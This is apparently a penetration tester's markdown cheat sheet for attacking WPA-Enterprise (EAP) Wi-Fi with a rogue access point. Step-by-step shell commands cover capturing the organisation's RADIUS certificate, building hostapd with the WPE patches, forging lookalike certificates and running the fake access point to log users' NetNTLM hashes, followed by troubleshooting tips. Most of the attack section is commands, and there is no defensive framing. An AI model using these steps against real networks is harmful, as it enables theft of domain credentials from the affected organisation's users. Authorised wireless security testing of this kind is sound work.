### Roque Access Point - Attack EAP (TLS)
It's hard to check a RADIUS server (Authenticator) certificate. So as long as the organization does not use client certificates, but simple domain authentication (Active Directory for instance), we can try to capture some netntlm hashes.

#### Attack
1. Get the certificate the organization uses. Try to authenticate (with a valid username) and use Wireshark to export the certificate. Just find the certificate in the packets. Export the bytes. This is DER encoding
2. Download hostapd-2.6
```shell
mkdir -p ~/hostapd-attack
cd  ~/hostapd-attack
wget https://w1.fi/releases/hostapd-2.6.tar.gz
tar -vxf hostapd-2.6.tar.gz
``` 
3. Grab the WPE patches and apply
```shell
git clone https://github.com/OpenSecurityResearch/hostapd-wpe.git
cd hostapd-2.6
patch -p1 < ../hostapd-wpe/hostapd-wpe.patch
```
4. Build hostapd
```
cd hostapd
make -j8
```
5. Build the certificate(s)
```
cd ../../hostapd-wpe/certs 

# Edit the required cnf files, to make the certificate look like the original.
ls *.cnf

# After editing
./bootstrap

### If all fails, clean it up!
make clean
make destroycerts
```

6. Modify hostapd-wpe.conf
```shell
cd ../../hostapd-2.6/hostapd/

#Edit the required sections.
grep -E '^ssid=|^channel=|^wpa=|^interface=' hostapd-wpe.conf
```

7. Attack
```shell
sudo ./hostapd-wpe ./hostapd-wpe.conf
```

8. Hashes will be stored in `./hostapd-wpe.log`

### Problems
If you have problems setting up the access point, check the following:
- Does the card support AP mode? `iw list | grep -i 'Supported interface modes' -A 10`
- Is the card being used by network manager? (Try to add `iface WLAN_NAME inet manual` to `/etc/network/interfaces` and restart `sudo systemctl restart NetworkManager `)



